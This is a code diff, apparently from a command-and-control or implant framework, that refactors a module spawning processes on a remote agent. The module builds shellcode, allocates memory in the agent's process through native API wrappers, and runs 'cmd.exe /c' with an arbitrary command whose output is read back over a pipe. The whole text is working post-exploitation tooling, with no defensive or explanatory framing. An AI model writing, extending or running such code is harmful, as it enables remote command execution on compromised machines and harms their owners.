@@ -55,7 +55,7 @@ def CreateProcessA(agent_id, command_line, h_pipe, p_private):
         p_private     # P10: lpProcessInformation
     ]
 
-    shellcode = push_rtl(func_addr, params)
+    shellcode = push_rtl(func_addr, params, agent.debug)
     data = process_information_data + si_data + cmdline_data
     param_names = [
     "lpApplicationName",
@@ -78,19 +78,16 @@ def CreateProcessA(agent_id, command_line, h_pipe, p_private):
             print(f"{name:<25} = {value}")
     return data, shellcode
 
-def function(agent_id, args, dependencies):
+def function(agent_id, args):
     from services.orders import write_to_agent, send_and_wait, read_from_agent
     import struct
-
-    NtAlloc = dependencies[0]
-    NtFree = dependencies[1]
     command = f"cmd.exe /c {args[0]}"
     h_pipe = args[1]
 
     # 1. Allocate Private Memory for structs
     mem_size = 1024
-    alloc_ret = NtAlloc(agent_id, [mem_size, 0x04])
-    if alloc_ret["NTSTATUS"] != 0:
+    alloc_ret = NtAllocateVirtualMemory(agent_id, [mem_size, 0x04])
+    if alloc_ret["retval"] != 0:
         return {"Result": "Failed to allocate process memory"}
     
     p_private = alloc_ret["allocated_memory"]
@@ -110,7 +107,7 @@ def function(agent_id, args, dependencies):
         h_proc = int.from_bytes(pi_raw[:8], 'little')
         h_thread = int.from_bytes(pi_raw[8:16], 'little')
 
-    NtFree(agent_id, [p_private, mem_size, 0x8000])
+    NtFreeVirtualMemory(agent_id, [p_private, mem_size, 0x8000])
 
     return {
         "Success": ret_val,
